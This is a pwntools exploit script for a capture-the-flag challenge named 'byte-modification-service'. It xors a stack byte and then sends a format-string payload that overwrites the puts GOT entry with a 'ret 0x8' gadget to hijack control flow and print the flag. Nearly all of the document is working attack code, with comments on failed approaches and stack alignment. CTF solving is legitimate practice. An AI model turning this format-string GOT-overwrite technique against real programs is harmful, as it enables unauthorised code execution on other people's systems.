#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context(terminal=['tmux','new-window'])

exe = context.binary = ELF(args.EXE or './chall')

host = args.HOST or 'byte-modification-service.challs.csc.tf'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# gdbscript = '''
# b vuln
# b *vuln+313
# b *0x40148d
# b win
# continue
# '''.format(**locals())

gdbscript = '''
b *vuln+313
b *bye+28
continue
'''.format(**locals())

# -- Exploit goes here --

# nevermind that, it'll get filtered anyway
where = exe.got['puts']
# what = exe.symbols['win'], didn't work because then you loop at every call of puts
# what = 0x40148d # address of last scanf + printf before bye, didn't work because of some weird stack align in scanf
what = asm('ret 0x8') # necessary to align the stack
what += b'\x01' # necessary to allow the write as an int
writes = {where:what}

# we control the stack address where the value to xor has been copied, which is the 9th parameter
# one 0x0a byte is written before, we take into account the 16 bytes used by the format specifier, so 2 quad words more
payload = fmtstr_payload(7, writes, numbwritten=1, write_size='int')
# print(payload)

io = start()

# stack position to get to a stack address containing 0x401130
io.sendline(b'39')
# byte index to xor, in this case the 1st byte
io.sendline(b'0')
# byte to xor there, we want to xor something with 0x30 to get 0x20: `0x30^0x20 == 16`
io.sendline(b'16')

io.recvuntil(b'improve our service.\n')

io.sendline(payload)
try:
    io.recvuntil(b'goodbye.\n')
    flag = io.recvline()
    print(flag.decode())
except:
    pass
